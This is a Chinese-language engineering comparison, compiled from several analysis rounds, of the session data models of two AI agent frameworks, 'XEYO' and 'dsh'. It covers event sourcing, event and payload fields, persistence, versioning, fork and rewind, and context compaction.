- rewind：v3 热路径 `rewind/hotpath.py`（默认）、v2 `rewind/service.py` 兼容；接口 `server/routers/rewind.py:168 /rewind`、`:192 /undo`、`:210 /recover`。

###### 对照

| 维度 | XEYO | dsh |
|---|---|---|
| 真相源粒度 | 消息（message-level） | 事件（event-sourced） |
| 能否重建"模型当时看到什么" | 靠投影函数重算，日志不含请求头 | `request/header` 入日志，**可逐字重建**；runtime invariant 强制校验 |
| 失败的模型尝试 | 无独立记录 | `assistant/attempt` 保留 |
| 版本迁移 | 轮转 2 代 | vN 代际 + 内存迁移 + 并排发布，永不改写旧代 |
| fork | `POST /v1/sessions/{id}/fork` | `SessionStore.fork()`，seed 前缀 + `inheritedEventCount`，禁止跨 open turn（`session/src/index.ts:1176-1234`） |
| 模型能否查询自己的历史 | 有 `JournalQuery`（查 rewind 日志） | **5 个只读工具**：`session_event_read`/`session_event_search`/`session_event_trace`/`session_search`/`session_trace`（`docs/tool-catalog.md:1304-1536`） |

> dsh 的「模型可查询自己的会话历史」是 XEYO 完全没有的能力面；XEYO 的 `rewind`（工作区回滚 + 崩溃恢复）是 dsh 完全没有的能力面（dsh 无 workspace rewind，只有 session fork）。

---


> 来源：**R2 设计面·设计级对比** · 原节「3. 会话数据模型与持久化」（源 L215–260）

##### 3. 会话数据模型与持久化

这是两端**结构差异最大**的一处，也是第一轮已点出、本轮把设计机理讲透的一处。

###### 3.1 dsh：事件溯源（event sourcing）

**真相源** = append-only `SessionEvent` 日志；模型历史是**投影**出来的。

- **事件词汇表**：`KNOWN_SESSION_EVENT_TYPES`（`core/session/src/known-event-types.ts:22-74`）共 73 个类型。
- **model-visible 只有 3 类**：`user/message`、`assistant/message`、`tool/result`，且必须带 `surfaceOp` 标记（`surface.ts:22-45`）。判定函数 `deriveEventMessage`（`surface.ts:90`）：非 surface 事件（turn/step 边界、`assistant/attempt`、`feedback/record`、`session/title`）返回 `null`（`surface.ts:117-119`）。
- **投影算法**：`foldSurface` 重放（`surface.ts:400`），`append` 推节点、`replace` 切片替换（`surface.ts:381-383`），增量由 `SurfaceManager._processDelta`（`surface.ts:417`）。
- **版本机制**：`SESSION_FORMAT_VERSION = 2`（`core/session/src/types.ts:86`，本轮已复核字面值）；header 校验在 `index.ts:101-103`；旧日志升级走**相邻迁移链** `createSessionFormatChain`（`session-format/src/chain.ts:38`）+ `defineSessionFormatMigration`（`chain.ts:21`）。
- **未知事件怎么办**：不按事件名注册，而是必须带 `ignorable` 标记，否则拒绝读整条日志——理由见 `known-event-types.ts:14-20`：「silently skipping … would reconstruct a wrong session」。
- **`assistant/message` 内嵌该步精确的压缩流** `AssistantStreamRecord[]`；失败的尝试进 `assistant/attempt`——**不伪造模型历史**。

**持久化**：

- append-only、**从不重写**（`session-persistence/src/index.ts:117-133`）。
- **崩溃安全**：torn physical tail 截断后不返回、append 前 truncate（`:117-119`）；`flush` 是持久性屏障（`:121-129`）。
- **resume 语义**：取 write 所有权 + 补 closers（`agent-loop/index.ts:878`）。
- **投影缓存**：`session-projection-cache` write-behind（计数/间隔触发 + 三个强制点 create/turn-end/dispose，`projection-cache/index.ts:301-352`），且**写前先 flush 日志**保证缓存不领先（`:256`）。

###### 3.2 XEYO：消息级 transcript

- **格式**：`message_to_dict`（`session/record_transcript.py:205`）→ `{id, role, content, tool_call_id, name, narration?, interrupted?, ts}`。**消息级，非事件级**。
- **路径**：`~/.xeyo/sessions/<id>.jsonl`（`session/persistence.py:60`），按 `id` 去重（`record_transcript.py:266,312`）。
- **权威关系**：磁盘 transcript 权威；常驻引擎内存经 `QueryEngine.replace_history` 整表对齐（`server/session_pool.py:319`）。
- **写入**：后台线程批量追加（`record_transcript.py:122-167`）+ 每批 `os.fsync`（`:156`）+ 同步直写路径也 fsync（`:282`）；轮转保留 2 代、原子 `os.replace`（`:65,95`）。
- **特殊 role**：`role=ui_thought` 行**仅供 UI**，engine hydrate 时跳过（`:361-368`）——这是"同一份日志承载两种消费者"的一处显式处理。
- **rewind**：v3 热路径（默认）与 v2 兼容（`rewind/service.py` / `server/session_pool.py:312-327`）；v2 = 整引擎丢弃，v3 = 热路径精细对齐（复位 compact 游标 / C2 摘要 / 锚点）。`revision.py` 的 `_append_json` 同样 fsync（`rewind/revision.py:43`）。

###### 3.3 设计分歧

| 维度 | dsh | XEYO |
|---|---|---|
| 真相源粒度 | 事件（73 类） | 消息 |
| 能否逐字重建"模型当时看到什么" | **能**——`request/header` 入日志 + runtime invariant 强制 | **不能**——靠投影函数重算，日志不含请求头 |
| 失败的模型尝试 | `assistant/attempt` 保留 | 无记录 |
| 版本迁移 | vN 代际 + 内存迁移 + 并排发布，**永不改写旧代** | 轮转 2 代 |
| fork | `SessionStore.fork()` + seed 前缀 + `inheritedEventCount`，禁止跨 open turn（`session/src/index.ts:1176-1234`） | `POST /v1/sessions/{id}/fork` |
| 投影一致性 | `replace` 可改写历史中间段（压缩用） | `compact.project` 在内存 history 上 transform |

**可借鉴性**：dsh 的"日志 = 唯一真相 + 请求头入日志"是**唯一能证明模型看到过什么**的方案。XEYO 的 rewind 与 dsh 的 fork 是两种不同的"回到过去"：rewind 回滚**工作区文件**（dsh 没有），fork 分叉**会话**（XEYO 有但轻）。

---


> 来源：**R3 实现面·实现级对比** · 原节「2. 会话数据模型：实现级」（源 L246–342）

##### 2. 会话数据模型：实现级

###### 2.1 dsh：48 个会话事件（实测）

**基线**：`packages/core/session/src/types.ts` 的 `SessionEventMap` 是 12 个核心事件；全仓另有 **26 个插件通过 `declare module` 合并**补入 36 个事件。实测**去重后 48 个**（`grep` 全量枚举，非估计）：

```
agent-preset/selected  approval/asked  approval/decided  approval/policy
assistant/attempt  assistant/message  command/done  command/run
compaction/end  compaction/prune  compaction/start  compaction/summary
feedback/record  goal/change  hook/invoked  hook/result
llm/retry  llm/retry-started  model/selection  permission/preset
plan/mode  request/context  request/header  sandbox/mode
schedule/change  session-log-deepseek/delivery-accepted  session/end-seed
session/title  session/title-llm-request  step/end  step/start
subagent/descriptor  subagent/model-selection-policy  team/member  team/task
todo/write  tool-workflow/agent-end  tool-workflow/agent-start
tool-workflow/run-end  tool-workflow/run-start  tool/call
tool/code-dispatch  tool/code-dispatch-start  tool/result
turn/end  turn/start  user/message  web/deepseek-search-llm-request
```

**核心 12 事件的 payload 逐字段**（`types.ts:260-376`）与 model-visible 判定：

| 事件 | payload 字段 | 何时发 | 进投影 | 可跳过 |
|---|---|---|---|---|
| `turn/start` | `turn` | `agent.ts:267` | ✗ | — |
| `turn/end` | `turn`, `reason: TurnEndReason` | `:331`（finally） | ✗ | — |
| `step/start` | `turn`, `step` | `:291` | ✗ | — |
| `step/end` | `turn`, `step` | `:304`（finally） | ✗ | — |
| `user/message` | `UserMessage`（含 `source`） | `:295` | **✓** | — |
| `assistant/message` | `turn, step, message, stream, usage?, interrupted?` | `:460`/`:389` | **✓** | — |
| `assistant/attempt` | `turn, step, stream` | `:407/413/430` | ✗（log-only） | — |
| `tool/call` | `turn, step, callId, name, arguments`（**原始未解析 JSON 串**） | `tool-calls.ts:264` | ✗ | — |
| `tool/result` | `turn, step, message, error?, meta?` | `tool-calls.ts:282` | **✓** | — |
| `request/header` | `header: EpochHeader`, `reason`, `startsSeries?` | `agent.ts:552/555/561` | ✗ | — |
| `request/context` | `provider, model, contextWindow?` | `:575` | ✗ | — |
| `session/end-seed` | `inherited?: true` | 仅 `Session` 构造器 | ✗ | — |

**四个机制细节**（都是实现级的、设计文档看不到的）：

1. **`ignorable` 保守默认**（`:456-465`）：事件信封有一个可选 `ignorable?: true`；**缺省意味着必需**——读到不认识的 `type` 且无此标记时，**读者必须拒绝重建**而不是静默跳过。注释："defaulting to required means a forgotten marker over-refuses (an inconvenience) rather than silently resuming a gutted session."

2. **`SessionSeq` 是 brand + 运行期校验**（`:36-41`）：非安全非负整数或 `-0` 一律 `TypeError`。

3. **`surfaceOp` 由类型系统强制**（`:466-475`）：只有 `user/message` / `assistant/message` / `tool/result`（`SurfaceEventType`）能带 `surfaceOp` 与 `sourceEventSeqs`；且 **v2 的 `assistant/message` 用 `sourceEventSeqs?: never` 硬禁**（`:426-432`）——因为它内嵌 provider stream，引用来源在语义上冲突。

4. **`SurfaceOp.replace`**（`:416-418`）：`{op:'replace', start, end}`，两端**必须都是既有 surface 节点**，且新节点的 `sourceEventSeqs` **必须包含被遮蔽的每一个节点**——这是压缩能安全改写的全部约束。

**`SESSION_FORMAT_VERSION = 2`**（`:86`）的升级判据写在注释里（`:64-85`），是一段罕见的、可直接执行的工程规则：

> bump 的判据是 **WRITER 发出什么**，不是新读者能接受什么。「parses without error」不算正确性——静默跳过影响重建的内容就是错误读。只有**结构变更**够格：header 形状、`SessionEvent` 信封、核心事件语义、或 surface 机制（`SurfaceEventType` 集合与 `SurfaceOp` 变体）。**新增普通事件类型不 bump**，由每事件的 `ignorable` 守卫覆盖词汇增长。拿不准就 bump。

**Header 中的持久化状态**（`:91-128`）：`version, id, createdAt, cwd?, parentSession?, isSeeded, origin?: 'subagent', delegationDepth?, agentPreset?`。其中 `delegationDepth` 与 `agentPreset` 的注释都给出了「为什么必须持久化」——**递归预算要跨重启存活**、**preset 决定工具与提示，恢复错组合会让模型面对已无法作用的历史**。

###### 2.2 XEYO：19 个引擎事件（实测）+ 20 个 dataclass

**文件**：`python/msgtypes/events.py`（333 行）

**实测**：文件里定义 **20 个 dataclass**，但 `EngineEvent` 联合只列 **19 个**——`PermissionExpiringEvent`（`:195-202`，`type="permission_expiring"`，默认提前 30s）**定义了但未进联合**（这是本轮实测到的实现级事实；第二轮写「20 个 dataclass / 19 个联合成员」与此一致）。

| 事件 | 关键字段 | 是否进 transcript |
|---|---|---|
| `AssistantDelta` | `text` | ✗（流式） |
| `ReasoningDelta` | `text` | ✗（流式） |
| `ToolCallEvent` | `name, input, tool_use_id, input_summary, parallel` | ✓ |
| `ToolProgressEvent` | `name, tool_use_id, message, elapsed_ms, xy?` | ✗（明示「不写 transcript」） |
| `ToolResultEvent` | `name, output, is_error, tool_use_id, todos?, operation_id?, ui?, duration_ms, spilled` | ✓ |
| `FinalEvent` | `text, prompt_tokens, completion_tokens, cache_hit/miss_tokens, usd, used_usd, usd_limit` | ✓ |
| `StoppedEvent` | `reason: max_turns\|max_tool_calling\|aborted\|budget\|budget_usd\|wall`, `budget_used_usd?`, `budget_limit_usd?`, `interrupted` | ✓ |
| `UsageEvent` | 12 个计数字段 + `cost_source` + `context_tokens/limit` + `context_breakdown` + `compact_cursor` + `c2_summary_chars` | ✗ |
| `ContextCompressionEvent` | `phase: start\|complete`, `source: automatic\|manual`, `context_tokens/limit` | ✗ |
| `ResultEvent` | `subtype`（7 值）, `result`, `is_error`, `duration_ms`, `num_turns`, `session_id`, `stop_reason`, budget 字段 | ✗ |
| `PermissionPendingEvent` | `request_id, tool_name, tool_input, reason, prompt, path?, expires_at?, choices, peer_summary, intent` | ✗（挂起信号） |
| `PermissionResolvedEvent` | `request_id, approved, actor, reason, resolved_at?, choice` | ✗ |
| `AskUserPendingEvent` | `request_id, session_id, turn_id, question, options, default?, expires_at?` | ✗ |
| `AskUserResolvedEvent` | `request_id, answer, actor, timeout, resolved_at?` | ✗ |
| `PlanPendingEvent` | `request_id, session_id, turn_id, plan, expires_at?` | ✗ |
| `PlanResolvedEvent` | `request_id, approved, actor, reason, resolved_at?` | ✗ |
| `TaskStateEvent` | `session_id, turn_id, task_status, current_tool?, interruptible, error?` | ✗ |
| `LlmRetryEvent` | `attempt, next_retry_ms, code, message, provider, model` | ✗（注释：非 surface） |
| `LlmRetryStartedEvent` | `attempt, provider, model` | ✗ |

**实现级对照**：

| 维度 | dsh | XEYO |
|---|---|---|
| 事件数 | **48**（12 核心 + 36 插件合并） | **19**（联合成员）/ 20 dataclass |
| 扩展机制 | `declare module` 类型合并（编译期，可被第三方包扩展） | 无（单一文件里的 `Union`，加事件要改这个文件） |
| 事件信封 | 统一 `{type, seq, time, data, ignorable?, surfaceOp?, sourceEventSeqs?}` | **无信封**：dataclass 各自为政，流式事件与落盘事件混在一个联合里 |
| 序号 | `seq` 单调、连续（注释明确要求） | 无 |
| 未知事件处理 | `ignorable` 保守拒绝 | 无概念（Python 反序列化即忽略未知字段） |
| 模型原始流 | 每 step 落 `assistant/message.stream` | 不落 |
| 版本化 | `SESSION_FORMAT_VERSION=2` + `ignorable` 双保险 | 无日志格式版本号 |

---


> 来源：**R4 枚举面·逐字段级对比** · 原节「§1 会话数据模型：逐事件、逐字段」（源 L67–250）

##### §1 会话数据模型：逐事件、逐字段

###### 1.1 dsh —— `SessionEventMap` 全 51 事件

**声明分布（51 = 12 核心 + 39 插件）**

| 命名空间 | 条数 | 声明文件 |
|---|---|---|
| `turn/` `step/` `user/` `assistant/` `tool/` `request/` `session/`（核心 12） | 12 | `core/session/src/types.ts` |
| `tool/code-dispatch*` | 2 | `core/tools/src/types.ts` |
| `compaction/` | 4 | `compaction/compaction/src/types.ts` |
| `team/` | 4 | `experimental/agent-team/src/types.ts` |
| `tool-workflow/` | 4 | `workflow/tool-workflow/src/types.ts` |
| `approval/` | 3 | `interaction/user-approval/{types,index}.ts` |
| `session/`（title ×2 + end-seed） | 3 | `session/session-title*/src/index.ts` |
| `assistant/` | 2 | `core/session/src/types.ts` |
| `command/` | 2 | `interaction/commands/src/types.ts` |
| `hook/` | 2 | `hooks/hook-protocol/src/types.ts` |
| `llm/` | 2 | `llm/llm-retry/src/types.ts` |
| `request/` | 2 | `core/session/src/types.ts` |
| `step/` `subagent/` `session-log-deepseek/` | 各 1~2 | 见下 |
| 其余单条 | 8 | 见下 |

**核心 12 事件逐字段（`core/session/src/types.ts`）**

| # | 事件 | 行 | payload 字段 | 何时发 | 进投影? |
|---|---|---|---|---|---|
| 1 | `turn/start` | 267 | `turn: number` | 循环在 claim 排队输入 / pre-step 之前开启 | ❌ log-only |
| 2 | `turn/end` | 276 | `turn: number` + `reason: TurnEndReason` | 用结束原因关闭 turn | ❌ |
| 3 | `step/start` | 278 | `turn: number`, `step: number` | 开启一步（一次模型调用 + 其请求的工具执行） | ❌ |
| 4 | `step/end` | 280 | `turn: number`, `step: number` | 关闭一步 | ❌ |
| 5 | `user/message` | 288 | `UserMessage`（整体，**无包装**） | 三类来源：真人 prompt / `agent.inject()` 合成上下文 / goal 续跑轮；靠 `source` 区分 | ✅ **surface** |
| 6 | `assistant/message` | 299 | `turn`, `step`, `message: AssistantMessage`, `stream: AssistantStreamRecord[]`, `usage?: TokenUsage`, `interrupted?: true` | 一步的组装后助手消息 | ✅ **surface** |
| 7 | `assistant/attempt` | 313 | `turn`, `step`, `stream: AssistantStreamRecord[]` | 一次**未提交 surface 消息**的模型尝试（失败/重试/取消/流错） | ❌ |
| 8 | `tool/call` | 319 | `turn`, `step`, `callId: ToolCallId`, `name: string`, `arguments: string` | 模型请求一次工具调用；`arguments` 是**未解析的原始 JSON 字符串** | ❌（配对用） |
| 9 | `tool/result` | 331 | `turn`, `step`, `message: ToolResultMessage`, `error?: {name, code}`, `meta?: JsonValue` | 工具调用完成 | ✅ **surface** |
| 10 | `request/header` | 342 | `header: EpochHeader`, `reason: RequestHeaderReason`, `startsSeries?: true` | 请求前记录完整头（config + system + tools） | ❌ log-only |
| 11 | `request/context` | 352 | `RequestContext`（`provider`, `model`, `contextWindow?`） | 路由或容量变化时才记 | ❌ |
| 12 | `session/end-seed` | 375 | `inherited?: true` | 构造器种子结束标记 | ❌ |

**`EpochHeader` 逐字段**（`:223-232`）

| 字段 | 类型 | 说明 |
|---|---|---|
| `config` | `LlmCallConfig` | provider / model / reasoningEffort / 采样标量 |
| `adapterDefaults?` | `LlmCallConfigAdapterDefaults` | 由适配器**实际物化**（非调用方提议）的字段 |
| `system?` | `string` | 渲染后的 system prompt 全文；无 system 的请求缺席 |
| `tools?` | `ToolSchema[]` | 装配后的工具 schema；无工具请求缺席 |

**`SessionHeader` 逐字段**（`:91-128`）

| 字段 | 类型 | 可选 | 语义 |
|---|---|---|---|
| `version` | `typeof SESSION_FORMAT_VERSION`（=2） | 否 | 逻辑格式版本 |
| `id` | `SessionId`（branded） | 否 | 会话 id |
| `createdAt` | `number` | 否 | Unix epoch **毫秒** |
| `cwd?` | `string` | 是 | 创建时的绝对工作目录 |
| `parentSession?` | `SessionId` | 是 | fork 血缘 |
| `isSeeded` | `boolean` | 否 | 是否含 fork 继承前缀 |
| `origin?` | `'subagent'` | 是 | 子代理子会话的产品分类（**仅展示元数据**，不证明可续跑） |
| `delegationDepth?` | `number` | 是 | 委派深度；持久化以便**递归预算跨重启存活** |
| `agentPreset?` | `string` | 是 | 组合本会话 agent 的 preset id；持久化因 preset 决定工具与提示 |

**`SessionEvent` 包封逐字段**（`:447-476`）

| 字段 | 类型 | 条件 | 语义 |
|---|---|---|---|
| `type` | `K extends SessionEventType` | 必有 | 判别式 |
| `seq` | `SessionSeq`（branded，非负安全整数） | 必有 | 会话内单调序号 |
| `time` | `number` | 必有 | Unix epoch ms |
| `data` | `SessionEventMap[K]` | 必有 | payload |
| `ignorable?` | `true` | 可选 | **缺席 = 必需**：读者遇到不认识的 type 且无此标记，必须**拒绝重建**而非静默丢弃 |
| `sourceEventSeqs?` | `SessionSeq[]` | 仅 surface 三事件 | 本事件引用的更早来源事件（如被 compaction 遮蔽的 surface 节点） |
| `surfaceOp?` | `SurfaceOp` | 仅 surface 三事件 | 如何进入有序 surface |

**surface 机制逐字段**

- `SurfaceEventType = 'user/message' | 'assistant/message' | 'tool/result'`（`:387-390`）——**只有这 3 个类型能产生 LLM 消息**。
- `SurfaceOp = 'append' | { op: 'replace'; start: SessionSeq; end: SessionSeq }`（`:416-418`）——`replace` 用于 compaction，且 `sourceEventSeqs` 必须包含每一个被遮蔽的 surface 节点。
- `SessionEventSurface = 'current' | 'shadowed' | 'log-only'`（从 api-catalog 声明反推，`extensions/tool-cordis/src/api-catalog.ts`）——把"日志里的事件"分成三态，UI/检索按此过滤。
- `RequestHeaderReason = 'initial' | 'resume' | 'change' | 'series'`（`:252`）。
- `TurnEndReasonMap` 6 变体（`:192-213`）：`completed` / `aborted{reason}` / `blocked` / `error{error: LlmFailure}` / `max-tokens` / `interrupted`。
  - `interrupted` 的注释极重要：**「崩溃孤儿 turn 由 resume 事后补关；循环从不活体发出该标记，崩溃前的事件保持完整」**——这是 XEYO「中断锚」的同类问题，dsh 的解法是"事后补一个类型化 closer"。
- `AgentCancelCause` 4 变体（`:180-184`）：`user` / `parent` / `hook{reason}` / `disposed`；`TurnEndCancelCause` 再加 `legacy`。

**插件 39 事件逐条（名 + 声明文件 + 一句话）**

| 事件 | 声明文件 | 语义 |
|---|---|---|
| `agent-preset/selected` | `preset/agent-presets/src/session.ts` | 本会话选定的 agent preset |
| `agent/inbox/spliced` | `core/agent/src/types.ts` | 收件箱队列被拼接（目标、起点、移除数、插入的 UserMessage[]、`outcome?: 'canceled'`） |
| `approval/asked` | `interaction/user-approval/src/types.ts` | 审批请求挂起 |
| `approval/decided` | 同上 | 审批结果 |
| `approval/policy` | `interaction/user-approval/src/index.ts` | 审批策略变更（**log-only**） |
| `command/run` | `interaction/commands/src/types.ts` | 斜杠命令开始 |
| `command/done` | 同上 | 斜杠命令结束 |
| `compaction/start` | `compaction/compaction/src/types.ts` | 压缩开括号（`{compactionId, sourceCommandId?, turn: number\|null}`） |
| `compaction/summary` | 同上 | 摘要体 + 被遮蔽区间 + token 计数 + provider/model/maxTokens/usage + `llmStreamCall` 判别 |
| `compaction/end` | 同上 | 压缩闭括号（含 `error?: string`） |
| `compaction/prune` | 同上 | 工具结果裁剪（无 LLM 参与的纯确定性压缩） |
| `feedback/record` | `feedback/command-feedback/src/index.ts` | 用户反馈落账 |
| `goal/change` | `goal/goal/src/domain.ts` | goal 状态变化 |
| `hook/invoked` | `hooks/hook-protocol/src/types.ts` | 钩子被调用（`{turn, point, dialect, matcher?, handlerId}`） |
| `hook/result` | 同上 | 钩子结果（`{turn, point, handlerId, decision, exitCode?, stderrSummary?, durationMs}`） |
| `llm/retry` | `llm/llm-retry/src/types.ts` | 重试调度决策 |
| `llm/retry-started` | 同上 | 重试实际开始 |
| `model/selection` | `api/session-controller/src/types.ts` | 模型选择 |
| `permission/preset` | `interaction/permission-presets/src/index.ts` | 权限预设切换（whole-value knob） |
| `plan/mode` | `plan/plan-mode/src/index.ts` | plan 模式（**as logged state**） |
| `sandbox/mode` | `sandbox/sandbox-policy/src/session-mode.ts` | 沙箱模式切换（**log-only**，含 `source?: 'delegation'`） |
| `schedule/change` | `schedule/schedule/src/types.ts` | 定时任务变更 |
| `session/title` | `session/session-title/src/index.ts` | 会话标题 |
| `session/title-llm-request` | `session/session-title-llm/src/index.ts` | 标题生成请求 |
| `session-log-deepseek/delivery-accepted` | `session/session-log-deepseek/src/types.ts` | 远端投递被接受 |
| `subagent/descriptor` | `subagent/subagent/src/descriptor.ts` | 子代理身份描述符 |
| `subagent/model-selection-policy` | `subagent/tool-subagent/src/model-selection-state.ts` | 子代理模型选择策略 |
| `team/member` | `experimental/agent-team/src/types.ts` | 团队成员快照（`version: 2`） |
| `team/task` | 同上 | 团队任务快照（`version: 2`） |
| `team/message/queued` | 同上 | 团队消息入队 |
| `team/message/delivered` | 同上 | 团队消息投递 |
| `todo/write` | `todo/tool-todo/src/types.ts` | 待办写入 |
| `tool-workflow/run-start` / `run-end` | `workflow/tool-workflow/src/types.ts` | workflow 运行括号 |
| `tool-workflow/agent-start` / `agent-end` | 同上 | workflow 内子 agent 括号 |
| `tool/code-dispatch-start` | `core/tools/src/types.ts` | PTC 子调用开始（`{rootCallId, parentCallId, subCallId, name, arguments}`） |
| `tool/code-dispatch` | 同上 | PTC 子调用结算（+`isError`, `content: ContentBlock[]`） |
| `web/deepseek-search-llm-request` | `web/web-search-deepseek/src/provider.ts` | 搜索用的 LLM 请求 |

> **注意 `team/*` 与 `tool/code-dispatch*` 的 `version` 字段**：事件 payload 自带版本号，是 dsh 应对"事件词汇演进"的第二层机制（第一层是 `ignorable`，第三层是 `SESSION_FORMAT_VERSION`）。

###### 1.2 XEYO —— 20 个 dataclass / 19 个联合成员

**文件**：`python/msgtypes/events.py`（333 行）

| # | dataclass | 行 | 字段（名:类型=默认） | 是否入 `EngineEvent` 联合 |
|---|---|---|---|---|
| 1 | `AssistantDelta` | 26 | `text: str`; `type="assistant_delta"` | ✅ |
| 2 | `ReasoningDelta` | 32 | `text: str`; `type="reasoning_delta"` | ✅ |
| 3 | `ToolCallEvent` | 38 | `name: str`; `input: dict`; `tool_use_id=""`; `input_summary=""`; `parallel=False`; `type` | ✅ |
| 4 | `ToolProgressEvent` | 49 | `name`; `tool_use_id=""`; `message=""`; `elapsed_ms=0`; `xy: dict\|None=None`; `type` | ✅ |
| 5 | `ToolResultEvent` | 65 | `name`; `output: str`; `is_error=False`; `tool_use_id=""`; `todos: list\|None`; `operation_id: str\|None`; `ui: dict\|None`; `duration_ms=0`; `spilled=False`; `type` | ✅ |
| 6 | `FinalEvent` | 83 | `text`; `prompt_tokens`; `completion_tokens`; `cache_hit_tokens`; `cache_miss_tokens`; `usd`; `used_usd`; `usd_limit`; `type` | ✅ |
| 7 | `StoppedEvent` | 97 | `reason: Literal[6 值]`; `budget_used_usd`; `budget_limit_usd`; `interrupted=False`; `type` | ✅ |
| 8 | `UsageEvent` | 108 | `prompt_tokens`; `completion_tokens`; `cache_hit_tokens`; `cache_miss_tokens`; `tokens`; `used_tokens`; `usd`; `used_usd`; `cny`; `used_cny`; `cost_source="estimate"`; `usd_limit`; `context_tokens`; `context_limit`; `context_breakdown`; `compact_cursor=0`; `last_action=""`; `c2_summary_chars=0`; `type`（**19 字段，全文件最重**） | ✅ |
| 9 | `ContextCompressionEvent` | 138 | `phase: Literal["start","complete"]`; `source: Literal["automatic","manual"]="automatic"`; `context_tokens`; `context_limit`; `type` | ✅ |
| 10 | `ResultEvent` | 149 | `subtype: Literal[7 值]`; `result=""`; `is_error`; `duration_ms`; `num_turns`; `session_id`; `stop_reason`; `budget_used_usd`; `budget_limit_usd`; `type` | ✅ |
| 11 | `PermissionPendingEvent` | 173 | `request_id`; `tool_name`; `tool_input`; `reason`; `prompt`; `path`; `expires_at`; `choices: list[str]=[]`; `peer_summary=""`; `intent="confirm"`; `type` | ✅ |
| 12 | `PermissionExpiringEvent` | 195 | `request_id`; `expires_at`; `seconds_left=30.0`; `type` | ❌ **不在联合里** |
| 13 | `PermissionResolvedEvent` | 205 | `request_id`; `approved: bool`; `actor=""`; `reason=""`; `resolved_at`; `choice=""`; `type` | ✅ |
| 14 | `AskUserPendingEvent` | 219 | `request_id`; `session_id`; `turn_id`; `question`; `options: list[str]=[]`; `default`; `expires_at`; `type` | ✅ |
| 15 | `AskUserResolvedEvent` | 237 | `request_id`; `answer=""`; `actor=""`; `timeout=False`; `resolved_at`; `type` | ✅ |
| 16 | `PlanPendingEvent` | 249 | `request_id`; `session_id`; `turn_id`; `plan`; `expires_at`; `type` | ✅ |
| 17 | `PlanResolvedEvent` | 261 | `request_id`; `approved`; `actor`; `reason`; `resolved_at`; `type` | ✅ |
| 18 | `TaskStateEvent` | 273 | `session_id`; `turn_id`; `task_status`; `current_tool`; `interruptible=True`; `error`; `type` | ✅ |
| 19 | `LlmRetryEvent` | 286 | `attempt`; `next_retry_ms`; `retry_code`（`code`）; `message=""`; `provider=""`; `model=""`; `type` | ✅ |
| 20 | `LlmRetryStartedEvent` | 303 | `attempt`; `provider=""`; `model=""`; `type` | ✅ |

**枚举取值逐条**

- `StoppedEvent.reason`（`:99`）：`max_turns` / `max_tool_calling` / `aborted` / `budget` / `budget_usd` / `wall`（**6 值**）
- `ResultEvent.subtype`（`:153-161`）：`success` / `error_max_turns` / `error_max_tool_calling` / `aborted` / `budget` / `budget_usd` / `error_during_execution`（**7 值**）
- `PermissionResolvedEvent.choice`（`:215` 注释）：`allow` / `deny` / `remind` / `timeout`（**4 值**）
- `PermissionPendingEvent.intent`（`:191`）：`confirm` / `choice` / `plan-review`（**3 值**）
- `PermissionExpiringEvent.seconds_left` 默认 **30.0**（提前 30s 预告）
- `AssistantDelta.type` = `"assistant_delta"`，但 **server 目录里零命中**——它在 SSE 层被编码成 OpenAI 兼容 chat chunk（见 §16）。

###### 1.3 字段级差异矩阵（会话模型）

| 维度 | dsh | XEYO | 差异性质 |
|---|---|---|---|
| 事件类型总数 | **51** | 20（19 生效） | dsh 多 31 个；多出的绝大多数是插件域（team/workflow/compaction/hook/schedule/goal） |
| payload 版本号 | 部分事件自带 `version`（`team/*` = 2） | 无 | dsh 可演进而旧读者仍可判 |
| 未知事件策略 | **`ignorable` 缺席即拒绝重建** | 无（未知 type 静默） | dsh fail-closed，XEYO fail-open |
| 日志格式版本 | `SESSION_FORMAT_VERSION = 2` + 迁移链 + `.v2` fixture | **无版本号** | dsh 有迁移工程，XEYO 无 |
| surface 概念 | 显式三态（current/shadowed/log-only）+ `SurfaceOp` + `sourceEventSeqs` | 无（transcript 直出） | dsh 有"投影层"，XEYO 无 |
| 事件封套字段 | `type/seq/time/data/ignorable/surfaceOp/sourceEventSeqs` | 无统一封套（dataclass 各自带 `type` 字符串） | dsh 统一包封，XEYO 扁平 |
| 时钟 | `time`（epoch ms） | 无（`resolved_at`/`expires_at` 局部有） | dsh 每条可排时，XEYO 仅挂起类有 |
| 顺序 | `seq` 单调 + 区间/游标类型（`SessionSeq`/`SessionSeqCursor`/`SessionLogOffset`） | 无序号 | dsh 类型化游标，XEYO 依赖数组下标 |
| tool 参数形态 | `arguments: string`（**原始 JSON 字符串，未解析**） | `input: dict`（已解析） | dsh 保原始字节，XEYO 已丢格式 |
| tool 错误 | `error?: {name, code}`（结构化） | `is_error: bool` + 文本 | dsh 有错误码，XEYO 只有布尔 |
| 中断 | `TurnEndReasonMap.interrupted` 事后补写 closer | `StoppedEvent.interrupted` + 落史锚 | 同题不同解 |
| 只读观测 | `SessionObservation{source: 'live'\|'prepared', projections?, retain()}` | 无 | dsh 有观察者协议 |

---


## 域 05 · 上下文投影与 KV 前缀缓存保护

> 来源：**R1 功能面·全量对比** · 原节「6. 上下文投影与压缩」（源 L149–161）

##### 6. 上下文投影与压缩

| | XEYO | dsh |
|---|---|---|
| 投影 | `project_for_model` 分 C0/C1/C2 三档 + 增量缓存 `proj_cache`（`query_loop.py:882-946`） | `ctx.sessionProjections` 注册式投影单元，增量 fold + `snapshot()` 裁剪批（`architecture.md:113`） |
| 压缩 | `compact.py` + `memory/compact`，预算 `budget.py`、`aging.py`、`result_fold`（重复结果折叠） | `ctx.compaction` seam（`compaction/src/index.ts:96-170`），provider `compaction-basic`，触发 `pressure`/`context-overflow`；区间替换为单个 summary 节点，`compaction/start..end` 锁定 |
| 工具结果瘦身 | `offload_read` 工具 + 结果折叠 | `compaction-tool-result-pruner`（`thresholdChars: 8192, headChars: 4096, tailChars: 1024`，standard preset）+ `ctx.spillStore` 超长文本落盘返回 locator |
| token 计量 | `usage/pricing.py` + 厂商权威 usage | `ctx.tokenMeter`（`token-meter/src/estimate.ts:43` 用 `CHARS_PER_TOKEN` 启发式）——**仅用于重放测量，不参与预算决策** |

**注意**：dsh **未见**显式的 token 预算/死线机制（预算类能力集中在 XEYO：`budget.py`、`runtime_budget`、`wrap_up` 收尾窗）。这是 XEYO 明显更强的一面。

---


> 来源：**R2 设计面·设计级对比** · 原节「4. 上下文投影与 KV 前缀保护」（源 L261–291）

##### 4. 上下文投影与 KV 前缀保护

###### 4.1 dsh：投影是纯函数 fold，前缀天然不动

- 决定者：`session.deriveMessages()`（`agent.ts:358`）+ surface 层。
